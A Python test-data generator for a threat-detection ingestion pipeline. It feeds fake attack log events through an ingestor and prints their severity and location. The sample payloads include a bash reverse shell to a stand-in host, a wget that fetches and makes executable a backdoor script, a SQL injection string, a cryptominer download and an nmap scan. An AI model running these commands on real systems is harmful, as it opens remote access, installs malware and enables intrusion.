import asyncio
import json
from src.ingestion.base_ingestor import BaseIngestor
from src.db import threat_db

async def generate_test_threats():
    await threat_db.init_pool()
    config = {'batch_size': 5, 'queue_size': 100}
    ingestor = BaseIngestor("test_generator", config)
    await ingestor.start()

    test_events = [
        {"ip": "91.109.190.234", "payload": "bash -i >&/dev/tcp/malicious.ru/4444 0>&1",
         "country": "Russia", "latitude": 55.7558, "longitude": 37.6173},
        {"ip": "218.92.0.107", "payload": "wget http://malware-c2.cn/backdoor.sh && chmod +x backdoor.sh",
         "country": "China", "latitude": 39.9042, "longitude": 116.4074},
        {"ip": "203.0.113.45", "payload": "' UNION SELECT * FROM users WHERE 1=1--",
         "country": "Unknown", "latitude": 0.0, "longitude": 0.0},
        {"ip": "185.220.101.182", "payload": "curl -s -L https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz",
         "country": "Germany", "latitude": 52.52, "longitude": 13.405},
        {"ip": "45.33.32.156", "payload": "nmap -sS -O target.company.com",
         "country": "United States", "latitude": 37.7749, "longitude": -122.4194}
    ]

    for event_data in test_events:
        log_entry = {
            "timestamp": "2024-01-15T10:30:00Z",
            "source_ip": event_data["ip"],
            "message": event_data["payload"],
            "user_agent": "curl/7.68.0",
            "endpoint": "/api/login",
            "geo": {
                "country": event_data["country"],
                "latitude": event_data["latitude"],
                "longitude": event_data["longitude"],
                "city": "Unknown",
                "isp": "N/A"
            }
        }

        json_data = json.dumps(log_entry).encode()
        events = await ingestor.parse_data(json_data)

        for event in events:
            # Ensure geo is a dict and latitude/longitude are set
            if isinstance(event.geo, str):
                try:
                    geo = json.loads(event.geo)
                except Exception:
                    geo = {}
            else:
                geo = event.geo or {}

            geo["latitude"] = event_data["latitude"]
            geo["longitude"] = event_data["longitude"]
            geo["country"] = event_data["country"]
            event.geo = geo

            print(f"Generated: {event.ip} - {event.severity} (Score: {event.score}) | "
                  f"{geo.get('latitude')},{geo.get('longitude')}")

    await ingestor.stop()
    print("Test data generation complete!")

if __name__ == "__main__":
    asyncio.run(generate_test_threats())
